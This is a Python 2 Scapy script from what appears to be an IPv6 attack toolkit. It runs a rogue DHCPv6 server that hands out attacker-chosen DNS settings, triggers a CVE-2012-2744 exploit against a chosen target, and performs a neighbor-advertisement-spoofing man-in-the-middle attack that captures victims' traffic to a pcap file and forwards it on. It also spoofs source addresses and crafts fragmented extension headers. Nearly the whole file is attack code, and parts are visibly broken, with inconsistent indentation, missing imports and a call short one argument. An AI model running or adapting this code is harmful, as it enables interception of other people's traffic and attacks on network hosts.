#!/usr/bin/python
import scapy.all
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	#supress Scapy warnings`
import scapy
import sys
import os
sys.path.append('../lib')
import netaddr
import auxiliary_functions
#import create_layers
import signal
import ipaddr
import time
import multiprocessing
import definitions
import auxiliary_functions
import attacks
import checkings
import create_extension_headers_chain

class MitmAttack():
    def __init__(self, filter, interface, source_ip, mac_source, victims, file_to_write):
        self.filter = filter
        self.interface = interface
	self.source_ip = source_ip
	self.mac_source = mac_source
	self.victims = victims
	self.file_to_write = file_to_write
    def run(self):
	print "Start sniffing and handling"
        scapy.sendrecv.sniff(filter=self.filter, iface=self.interface, prn=self.mitm_attack, store=0)
    def mitm_attack(self,packets):
	if packets.nh == 58 and packets.payload.type == 135:
		attacks.soliceted_neighbor_advertisement_spoofing(packets,self.mac_source, self.interface)
	elif not packets.payload.dst == self.source_ip:
		if packets.dst == self.mac_source:
			if not packets.payload.dst[0:6] == "fe80::":
				packets.dst=self.victims[packets.payload.dst]
				writer = PcapWriter(self.file_to_write, append=True)
				writer.write(packets)
                    		writer.close()
				sendp(packets,iface=self.interface)

class SpoofUnNA():
    	def __init__(self, victims, myinterface, mac_source):
        	self.victims = victims
		self.myinterface = myinterface
		self.mac_source = mac_source
	def run ( self ):
		while(True):
    			try:
				attacks.unsoliceted_neighbor_advertisement_spoofing(self.victims, self.myinterface, self.mac_source)
				time.sleep(2)
    			except KeyboardInterrupt:
        			exit(0)

class DHCPv6Attack():
#TODO
#A. DHCPv6 Server
	#1. Implement Renew
	#2. DHCP INFORM messages (for "the O-flag variant")
    def __init__(self,filter,interface,mac_source, source_ip, dhcpv6_preference,prefered_lft,valid_lft,DNS_Domain_name,DNS_Servers,list_of_unfragmented_ext_headers,list_of_fragmented_ext_headers,size_of_extheaders,number_of_fragments,list_of_next_headers,list_of_offsets,list_of_fragment_lengths,list_of_fragment_m_bits,prefix,hoplimit,lEu,first_next_header_value,fragmentable_extension_headers,size_of_fragmentable_extension_headers,s):
	self.filter=filter
	self.assigned_IPv6_addresses_cache={}
	self.interface=interface
	self.mac_source=mac_source
	self.source_ip=source_ip
	self.dhcpv6_preference=dhcpv6_preference
	self.prefered_lft=prefered_lft
	self.valid_lft=valid_lft
	self.DNS_Domain_name=DNS_Domain_name
	self.DNS_Servers=DNS_Servers
	self.list_of_unfragmented_ext_headers=list_of_unfragmented_ext_headers
	self.list_of_fragmented_ext_headers=list_of_fragmented_ext_headers
	self.size_of_extheaders=size_of_extheaders
	self.number_of_fragments=number_of_fragments
	self.list_of_next_headers=list_of_next_headers
	self.list_of_offsets=list_of_offsets
	self.list_of_fragment_lengths=list_of_fragment_lengths
	self.list_of_fragment_m_bits=list_of_fragment_m_bits
	self.prefix=prefix
	self.hoplimit=hoplimit
	self.lEu=lEu
	self.first_next_header_value=first_next_header_value
	self.fragmentable_extension_headers=fragmentable_extension_headers
	self.size_of_fragmentable_extension_headers=size_of_fragmentable_extension_headers
	self.s=s
    def run(self):
	print "Start sniffing and handling"
        scapy.sendrecv.sniff(filter=self.filter, iface=self.interface, prn=self.dhcpv6_attack, store=0)
    def dhcpv6_attack(self,packets):
	if packets.haslayer(scapy.layers.inet.UDP):
			macdst=packets.src
			layer3_header = packets.getlayer(scapy.layers.inet6.IPv6)
			ipv6dst = layer3_header.src
			layer4_header = packets.getlayer(scapy.layers.inet.UDP)
			unfragmentable_part,size_of_unfragmentable_part=create_extension_headers_chain.create_unfragmentable_part(self.source_ip,ipv6dst,self.hoplimit,self.lEu,self.size_of_extheaders,0)
			if (layer4_header.sport==546 and layer4_header.dport==547):
				if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6_Solicit):
					attacks.DHCPv6_Solicit=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6_Solicit)
					Trid = attacks.DHCPv6_Solicit.trid
					print "DHCPv6 Solicit packet received with Transaction ID", Trid, "from",macdst
					IaId = 11111111#CHECK IT
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptClientId):
						ClientID=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptClientId)
						ClientID_len = ClientID.optlen
						ClientID_duid = ClientID.duid
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptIA_NA):
						iana=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptIA_NA)
						IaId = iana.iaid
 					attacks.DHCPv6_Response(self.mac_source, self.source_ip, macdst, ipv6dst, Trid, ClientID_len, ClientID_duid, IaId, "Advertise", self.assigned_IPv6_addresses_cache, self.interface,self.dhcpv6_preference, self.prefered_lft,self.valid_lft,self.DNS_Domain_name,self.DNS_Servers, self.list_of_unfragmented_ext_headers,self.list_of_fragmented_ext_headers,self.size_of_extheaders, self.number_of_fragments,self.list_of_next_headers,self.list_of_offsets,self.list_of_fragment_lengths,self.list_of_fragment_m_bits,self.prefix,unfragmentable_part,size_of_unfragmentable_part,self.first_next_header_value,self.fragmentable_extension_headers,self.size_of_fragmentable_extension_headers,self.s)
				elif layer4_header.haslayer(scapy.layers.dhcp6.DHCP6_Request):
					attacks.DHCPv6_Request=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6_Request)
					Trid =attacks. DHCPv6_Request.trid
					print "DHCPv6 Request packet received with Transaction ID", Trid, "from",macdst
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptClientId):
						ClientID=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptClientId)
						ClientID_len = ClientID.optlen
						ClientID_duid = ClientID.duid
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptIA_NA):
						iana=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptIA_NA)
						IaId = iana.iaid
 					attacks.DHCPv6_Response(self.mac_source, self.source_ip,macdst, ipv6dst, Trid, ClientID_len, ClientID_duid, IaId, "Reply", self.assigned_IPv6_addresses_cache, self.interface,self.dhcpv6_preference, self.prefered_lft,self.valid_lft,self.DNS_Domain_name,self.DNS_Servers, self.list_of_unfragmented_ext_headers,self.list_of_fragmented_ext_headers,self.size_of_extheaders, self.number_of_fragments,self.list_of_next_headers,self.list_of_offsets,self.list_of_fragment_lengths,self.list_of_fragment_m_bits,self.prefix,unfragmentable_part,size_of_unfragmentable_part,self.first_next_header_value,self.fragmentable_extension_headers,self.size_of_fragmentable_extension_headers)
				elif layer4_header.haslayer(scapy.layers.dhcp6.DHCP6_Renew):
					attacks.DHCPv6_Renew=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6_Renew)
					Trid = attacks.DHCPv6_Renew.trid
					print "DHCPv6 Renew packet received with Transaction ID", Trid, "from",macdst
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptClientId):
						ClientID=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptClientId)
						ClientID_len = ClientID.optlen
						ClientID_duid = ClientID.duid
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptIA_NA):
						iana=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptIA_NA)
						IaId = iana.iaid
 					attacks.DHCPv6_Response(self.mac_source, self.source_ip,macdst, ipv6dst, Trid, ClientID_len, ClientID_duid, IaId, "Reply", self.assigned_IPv6_addresses_cache, self.interface,self.dhcpv6_preference, self.prefered_lft,self.valid_lft,self.DNS_Domain_name,self.DNS_Servers, self.list_of_unfragmented_ext_headers,self.list_of_fragmented_ext_headers,self.size_of_extheaders, self.number_of_fragments,self.list_of_next_headers,self.list_of_offsets,self.list_of_fragment_lengths,self.list_of_fragment_m_bits,self.prefix,unfragmentable_part,size_of_unfragmentable_part,self.first_next_header_value,self.fragmentable_extension_headers,self.size_of_fragmentable_extension_headers)
				elif layer4_header.haslayer(scapy.layers.dhcp6.DHCP6_Confirm):
					attacks.DHCPv6_Confirm=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6_Confirm)
					Trid = attacks.DHCPv6_Confirm.trid
					print "DHCPv6 Confirm packet received with Transaction ID", Trid, "from",macdst
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptClientId):
						ClientID=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptClientId)
						ClientID_len = ClientID.optlen
						ClientID_duid = ClientID.duid
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptIA_NA):
						iana=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptIA_NA)
						IaId = iana.iaid
 					attacks.DHCPv6_Response(self.mac_source, self.source_ip,macdst, ipv6dst, Trid, ClientID_len, ClientID_duid, IaId, "Reply", self.assigned_IPv6_addresses_cache, self.interface,self.dhcpv6_preference, self.prefered_lft,self.valid_lft,self.DNS_Domain_name,self.DNS_Servers, self.list_of_unfragmented_ext_headers,self.list_of_fragmented_ext_headers,self.size_of_extheaders, self.number_of_fragments,self.list_of_next_headers,self.list_of_offsets,self.list_of_fragment_lengths,self.list_of_fragment_m_bits,self.prefix,unfragmentable_part,size_of_unfragmentable_part,self.first_next_header_value,self.fragmentable_extension_headers,self.size_of_fragmentable_extension_headers)
				elif layer4_header.haslayer(scapy.layers.dhcp6.DHCP6_Rebind):
					attacks.DHCPv6_Rebind=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6_Rebind)
					Trid = attacks.DHCPv6_Rebind.trid
					print "DHCPv6 Rebind packet received with Transaction ID", Trid, "from",macdst
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptClientId):
						ClientID=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptClientId)
						ClientID_len = ClientID.optlen
						ClientID_duid = ClientID.duid
					if layer4_header.haslayer(scapy.layers.dhcp6.DHCP6OptIA_NA):
						iana=layer4_header.getlayer(scapy.layers.dhcp6.DHCP6OptIA_NA)
						IaId = iana.iaid
 					attacks.DHCPv6_Response(self.mac_source, self.source_ip,macdst, ipv6dst, Trid, ClientID_len, ClientID_duid, IaId, "Reply", self.assigned_IPv6_addresses_cache, self.interface,self.dhcpv6_preference, self.prefered_lft,self.valid_lft,self.DNS_Domain_name,self.DNS_Servers, self.list_of_unfragmented_ext_headers,self.list_of_fragmented_ext_headers,self.size_of_extheaders, self.number_of_fragments,self.list_of_next_headers,self.list_of_offsets,self.list_of_fragment_lengths,self.list_of_fragment_m_bits,self.prefix,unfragmentable_part,size_of_unfragmentable_part,self.first_next_header_value,self.fragmentable_extension_headers,self.size_of_fragmentable_extension_headers)

def main():
	#LET'S PARSE THE ARGUMENTS FIRST
	parser = argparse.ArgumentParser(version='0.8',description='An IPv6 neighbor discovery packet tool with enhanced capabilities and flexibility.')
	parser.add_argument('interface',  action="store", help="the network interface to use.")
	parser.add_argument('-gw','--gateway', action="store", dest="gateway", help="a gateway to use (only if required).")
	parser.add_argument('-s', '--source',  action="store", dest="source", default=False, help="the IPv6 address of the sender (if you want to spoof it).")
	parser.add_argument('-d', '--destination', action="store", dest="destination", help="the IPv6 address(es) of the target(s) - comma separated.")
	parser.add_argument('-rs', '--random-source',  action="store_true", dest="random_source", default=False, help="randomise the IPv6 address of the sender (if you want to spoof it randomly).")
	parser.add_argument('-m', '--mac',  action="store", dest="mac_source", default=False, help="the mac address of the sender (if you want to spoof it).")
	parser.add_argument('-tm', '--target_mac',  action="store", dest="target_mac", default=False, help="the mac address of the target (if you want to define it to avoid Neighbor Solicitation).")
	parser.add_argument('-rm', '--random-mac',  action="store_true", dest="random_mac", default=False, help="randomise the MAC address of the sender (if you want to spoof it randomly).")
	parser.add_argument('-pr', '--prefix', action="store", dest="prefix", default="fe80::", help="the IPv6 network prefix to use. Example: fe80:224:54ff:feba::")
	parser.add_argument('-lfE','--list_fragmented_Extension_Headers', action="store", dest="lEf", default=False, help="Define an arbitrary list of Extension Headers which will be included in the fragmentable part")
	parser.add_argument('-luE','--list_unfragmented_Extension_Headers', action="store", dest="lEu", default=False, help="Define an arbitrary list of Extension Headers which will be included in the unfragmentable part")
	parser.add_argument('-hoplimit','--Hop_Limit', action="store", dest="hoplimit", default=False, help="The Hop Limit value of the IPv6 Header. Default: 255 (for MLD, default=1).")
	parser.add_argument('-nf','--no_of_fragments', action="store", dest="number_of_fragments", default=0, help="the number of fragments to send")
	parser.add_argument('-lnh','--list_of_next_headers', action="store", dest="list_of_next_headers", default=False, help="the list of next headers to be used in the Fragment Headers, comma_separated")
	parser.add_argument('-lo','--list_of_offsets', action="store", dest="list_of_offsets", default=False, help="the list of offsets to be used in the Fragment Headers when fragmentation takes place, comma_separated (optional)")
	parser.add_argument('-ll','--list_of_fragment_lengths', action="store", dest="list_of_fragment_lengths", default=False, help="the list of fragment lengths to be used in the Fragment Headers when fragmentation takes place, comma_separated (optional)")
	parser.add_argument('-lm','--list_of_fragment_m_bits', action="store", dest="list_of_fragment_m_bits", default=False, help="the list of fragment M (More Fragments to Follow) bits to be used in the Fragment Headers when fragmentation takes place, comma_separated (optional)")
	parser.add_argument('-seh','--size_of_extension_header', action="store", dest="size_of_extheaders", default=1, help="the size of the additional Extension Header (in octets of bytes)")
	parser.add_argument('-l4','--layer4', action="store", dest="layer4", default="icmpv6", help="the layer4 protocol")
	parser.add_argument('-l4_data','--layer4_payload', action="store", dest="l4_data", default="", help="the payload of layer4")
	parser.add_argument('-dhcpv6_server','--dhcpv6-server', action="store_true", dest="dhcpv6_server", default=False, help="DHCPv6 service operation")
	parser.add_argument('-dhcpv6_preference','--dhcpv6_preference', action="store", dest="dhcpv6_preference", default=255, help="Preference of the DHCPv6 Server")
	parser.add_argument('-dhcpv6_prefered_lft','--dhcpv6_prefered_lft', action="store", dest="dhcpv6_prefered_lft", default=375, help="Prefered lifetime of the DHCPv6 Server")
	parser.add_argument('-dhcpv6_valid_lft','--dhcpv6_valid_lft', action="store", dest="dhcpv6_valid_lft", default=600, help="Valid lifetime of the DHCPv6 Server")
	parser.add_argument('-dhcpv6_DNS_Domain_name','--dhcpv6_DNS_Domain_name', action="store", dest="dhcpv6_DNS_Domain_name", default="mylab.example", help="DNS Domain name of the DHCPv6 Server")
	parser.add_argument('-dhcpv6_DNS_Server','--dhcpv6_DNS_Server', action="store", dest="dhcpv6_DNS_Server", default="2001:db8:1:1::1000", help="DNS Server provided by the DHCPv6 Server")
	parser.add_argument('-CVE_2012_2744','--CVE_2012_2744', action="store_true", dest="CVE_2012_2744", default=False, help="CVE 2012-2744 Exploitation")
	parser.add_argument('-mitm','--slaac_mitm', action="store_true", dest="mitm", default=False, help="Man in the Middle Attack Using SLAAC Attack")
	parser.add_argument('-mitm_pcap','--mitim_pcap_file', action="store", dest="mitm_pcap", default="/tmp/mitm.pcap", help="pcap file where the traffic captured using the MITM attack will be stored.")
	
	#print "Usage: program.py <your_ipv6_address> <targets_comma_separated> <iface> <pcap_file_to_write_captured_traffic>"
	values = parser.parse_args()

	###LETS TO SOME CHECKS FIRST TO SEE IF WE CAN WORK###	
	if os.geteuid() != 0:
	      	print "You must be root to run this script."
	      	exit(1)  
	if (not values.dhcpv6_server and not values.CVE_2012_2744 and not values.mitm):
		print "Please tell me what you want me to do"
		exit(0)
	#scapy.config.conf.verb=0
	scapy.layers.inet6.conf.verb=0

	myinterface=values.interface

	#GET YOUR SOURCE IPV6 AND MAC ADDRESS
	mac_source=definitions.define_source_mac_address(values.mac_source,values.random_mac)
	source_ip,mac_source= definitions.define_source_ipv6_address(values.source,mac_source,values.interface,values.random_source,values.prefix)
	print "Source MAC address", mac_source, "Source IPv6 Address",source_ip

	if values.dhcpv6_server:
		#check if fragmentation parameters are OK
		list_of_fragment_lengths,list_of_offsets,list_of_fragment_m_bits,list_of_next_headers=checkings.check_fragmentation_parameters(values.list_of_fragment_lengths,values.list_of_offsets,values.list_of_fragment_m_bits,values.list_of_next_headers,values.number_of_fragments)
		list_of_unfragmented_ext_headers=[]
		list_of_fragmented_ext_headers=[]
		if values.lEu:
			list_of_unfrag_ext_headers=create_extension_headers_chain.make_list_of_ext_headers(values.lEu)
			list_of_unfragmented_ext_headers=create_extension_headers_chain.identify_parameters(list_of_unfrag_ext_headers)
		if values.lEf:
			list_of_frag_ext_headers=create_extension_headers_chain.make_list_of_ext_headers(values.lEf)
			list_of_fragmented_ext_headers=create_extension_headers_chain.identify_parameters(list_of_frag_ext_headers)
		fragmentable_extension_headers,size_of_fragmentable_extension_headers,first_next_header_value=create_extension_headers_chain.create_fragmentable_part(values.lEf,int(values.size_of_extheaders),0)

		print "Starting sniffing..."
		myfilter = "ip6"
		print "Sniffer filter is",myfilter
		s = scapy.config.conf.L2socket(iface=myinterface) # Open Socket Once
		dhcpv6attack=DHCPv6Attack(myfilter,values.interface,mac_source, source_ip, values.dhcpv6_preference,values.dhcpv6_prefered_lft,values.dhcpv6_valid_lft,values.dhcpv6_DNS_Domain_name,values.dhcpv6_DNS_Server,list_of_unfragmented_ext_headers,list_of_fragmented_ext_headers,values.size_of_extheaders,values.number_of_fragments,list_of_next_headers,list_of_offsets,list_of_fragment_lengths,list_of_fragment_m_bits,values.prefix,int(values.hoplimit),values.lEu,first_next_header_value,fragmentable_extension_headers,size_of_fragmentable_extension_headers,s)
		dhcpv6attack.run()
        	#sniff(filter=myfilter, iface=values.interface, prn=handler, store=0)
	elif values.CVE_2012_2744:
		if not values.destination:
			print "You must define your target (destination)"
			exit(0)
		else:
			addr6 = ipaddr.IPAddress(values.destination)
			myaddr=addr6.exploded
			if myaddr[0:2]=="ff":
				if int(myaddr[2]) >= 0 and int(myaddr[2]) < 8:
					ether_dst="33:33:"+myaddr[30:32]+":"+myaddr[32:37]+":"+myaddr[37:39]
			elif values.gateway:
				ether_dst=auxiliary_functions.find_single_mac(source_ip, values.gateway, values.interface)
			else:
				if values.target_mac:
					ether_dst=values.target_mac
				else:
					ether_dst=auxiliary_functions.find_single_mac(source_ip, myaddr, values.interface)
					if not ether_dst:
						print "Destination was not found. Please consider defining a gateway, if needed."
			
			print "Destination MAC address", ether_dst, "Destination IPv6 Address",values.destination
			attacks.CVE_2012_2744(values.interface,mac_source,source_ip,values.destination,ether_dst)
	elif values.mitm:
		file_to_write = values.mitm_pcap 
		ip_list = values.destination.split(",")
		victims=attacks.find_mac_using_spoofed_source(source_ip, ip_list, myinterface, mac_source)
		print "the victims are",victims
		q = multiprocessing.Queue()
		pr = multiprocessing.Process(target=SpoofUnNA, args=(victims, myinterface, mac_source,))
		pr.daemon = True
		pr.start()
#		signal.signal(signal.SIGINT, signal_handler)
		myfilter="ip6"
		mitm=MitmAttack(myfilter, values.interface, source_ip, mac_source, victims, file_to_write)
		mitm.run()

if __name__ == '__main__':
    main()
